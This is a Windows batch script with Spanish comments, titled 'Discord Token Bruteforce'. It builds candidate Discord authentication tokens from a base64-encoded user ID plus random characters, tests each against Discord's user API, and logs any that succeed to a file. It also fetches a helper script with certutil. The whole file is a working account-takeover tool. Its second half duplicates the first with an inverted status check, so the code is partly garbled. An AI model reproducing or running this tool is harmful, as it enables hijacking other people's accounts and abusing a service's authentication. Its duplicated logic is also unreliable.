@echo off
cls
:: Ingreso enabledelayedexpansion por el generador de lineas y enableextensions para evitar algun
:: Inconveniente con if o set
setlocal enableextensions enabledelayedexpansion
color 0A
set gennum=0
:: Se requiere para generar un request desde discord hasta el pc local
if not exist winhttpjs.bat (
    certutil -urlcache -split -f https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/jscript/winhttpjs.bat winhttpjs.bat 1>nul 2>nul
)
cls
:main
set "function=winhttpjs.bat https://discordapp.com/api/v6/users/@me -method GET -reportfile report.txt -headers-file head.txt -force yes"
::(
mode con cols=120 lines=40
title Discord Token Bruteforce, hecho por NK125
echo Discord Token Bruteforce-Port en Batch por NK125 #ZedSquad
echo.
echo Basado en el script original: https://github.com/OSintaxys/ZD-TokenBruteForce-for-Discord
echo Version 1.2, puede contener algunos errores.
echo.
set /p pass="Ingresa la contraseña:"
if %pass% NEQ 123 (
    echo.
    echo Acceso Denegado.
    timeout /t 3 /nobreak
    exit
) else (
    echo.
    echo Bienvenido.
    timeout /t 2 /nobreak>nul
    echo.
    echo Si no tienes conexion a internet todos los tokens seran regresados como Invalidos.
    echo.
)
if not exist winhttpjs.bat (
    echo Por favor descargue el archivo .bat de la siguiente url:
    echo.
    echo https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/jscript/winhttpjs.bat
    echo.
    echo Y muevalo a la carpeta actual: %cd%
    echo.
    pause
)
:choice
choice /C AB /M "Bruteforce Random [A] o por ID [B]?"
if %errorlevel%==1 (
    echo Iniciando.
    goto brute
) else (
    echo.
    set /p ID="Ingresa la ID del usuario:"
    echo Iniciando.
    goto IDcheck
)
::)
:: Funcion de ID Random
:: Solo genera ID's aleatorias y las prueba una a una con diferentes caracteres
:brute
call :gennum 18
set ID=!rannum!
call :IDcheck
goto brute
:: Funcion de ID Proporcionada
:IDcheck
:: Elimina la variable token
set token=
echo %ID%>id.txt
REM Convertir texto plano a base 64
certutil -f -encode id.txt id.txt 1>nul 2>nul
:: type id = id en base 64, findstr = eliminar -----begin, end certificate----- y escribir en la variable id64 el primer resultado
for /f %%g in ('type id.txt ^| findstr /I /V /C:"-----"') do (
    set ID64=%%g
    goto funcmain
)
del id.txt /f /s /q 1>nul 2>nul
:funcmain
set token=
:: set = importa de id64 25 letras delante del inicio de linea
set idf=%id64:~0,24%
:: Genera una linea de texto al azar de 35 letras
call :genlinea 35
:: ID.Base64 + String = 60 caracteres - 1 = 59 caracteres justos para el token
:: En la variable token agrega la ID en base 64 y las 35 letras
set token=!idf!!string!
echo Authorization:%token%>head.txt
echo Content-Type:application/json>>head.txt
:: Errorlevel es igual a 2 para evitar un cambio no autorizado del valor por un comando externo, exit /b,
echo.
call %function% | findstr /I /C:"Status: 200"
IF %ERRORLEVEL%==0 (
    echo Valido^! Token="%token%"
    echo Bat-Py Port Script por NK125
    echo Puedes encontrar el token en %cd%\TokenFound.txt
    echo Presione una tecla para continuar
    echo %token%>>TokenFound.txt
    pause>nul
    goto main
) else (
    echo Invalido: %token%
)
goto funcmain
:: Funcion generar lineas
:genlinea
set "length=%1"
set "alpha=abcdefghijklmnopqrstuvwxyz.ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_987654321"
set alphaCnt=73
Set "string="
For /L %%j in (1,1,%length%) DO (
    Set /a i=!random! %% alphaCnt
    Call Set string=!string!%%alpha:~!i!,1%%
)
exit /b
:: Funcion generar numero al azar
:gennum
set gennum=1
set length=%1
set coun=0
set rannum=
:loop
set /a coun+=1
set ran=%random%
set rannum=!rannum!%ran:~0,1%
if not %coun%==%length% goto loop
exit /b
if %errorlevel%==1 (
    echo Iniciando.
    goto brute
) else (
    echo.
    set /p ID="Ingresa la ID del usuario:"
    echo Iniciando.
    goto IDcheck
)
::)
:: Funcion de ID Random
:: Solo genera ID's aleatorias y las prueba una a una con diferentes caracteres
:brute
call :gennum 18
set ID=!rannum!
call :IDcheck
goto brute
:: Funcion de ID Proporcionada
:IDcheck
:: Elimina la variable token
set token=
echo %ID%>id.txt
REM Convertir texto plano a base 64
certutil -f -encode id.txt id.txt 1>nul 2>nul
:: type id = id en base 64, findstr = eliminar -----begin, end certificate----- y escribir en la variable id64 el primer resultado
for /f %%g in ('type id.txt ^| findstr /I /V /C:"-----"') do (
    set ID64=%%g
    goto funcmain
)
del id.txt /f /s /q 1>nul 2>nul
:funcmain
set token=
:: set = importa de id64 25 letras delante del inicio de linea
set idf=%id64:~0,24%
:: Genera una linea de texto al azar de 35 letras
call :genlinea 35
:: ID.Base64 + String = 60 caracteres - 1 = 59 caracteres justos para el token
:: En la variable token agrega la ID en base 64 y las 35 letras
set token=!idf!!string!
echo Authorization:%token%>head.txt
echo Content-Type:application/json>>head.txt
:: Errorlevel es igual a 2 para evitar un cambio no autorizado del valor por un comando externo, exit /b,
call %function% | findstr /I /C:"Status: 401"
IF %ERRORLEVEL%==1 (
    echo Valido^! Token="%token%"
    echo Bat-Py Port Script por NK125
    echo Puedes encontrar el token en %cd%\TokenFound.txt
    echo Presione una tecla para continuar
    echo %token%>>TokenFound.txt
    pause>nul
    goto main
) else (
    echo Invalido: %token%
)
goto funcmain
:: Funcion generar lineas
:genlinea
set "length=%1"
set "alpha=abcdefghijklmnopqrstuvwxyz.ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_987654321"
set alphaCnt=73
Set "string="
For /L %%j in (1,1,%length%) DO (
    Set /a i=!random! %% alphaCnt
    Call Set string=!string!%%alpha:~!i!,1%%
)
exit /b
:: Funcion generar numero al azar
:gennum
set gennum=1
set length=%1
set coun=0
set rannum=
:loop
set /a coun+=1
set ran=%random%
set rannum=!rannum!%ran:~0,1%
if not %coun%==%length% goto loop
exit /b
